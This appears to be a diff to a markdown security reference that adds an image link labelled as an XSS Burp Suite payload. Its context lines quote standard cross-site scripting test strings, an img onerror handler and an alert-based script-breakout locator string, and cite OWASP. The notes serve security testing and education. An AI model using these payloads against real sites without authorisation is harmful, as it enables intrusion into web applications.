@@ -719,6 +719,7 @@ You searched for: <img src=1 onerror='/* Bad stuff here... */'>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
 '';!--"<XSS>=&{()}
 ```
+- ![XSS burpsuite payload](https://i.imgur.com/lafkLqE.png)
 
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
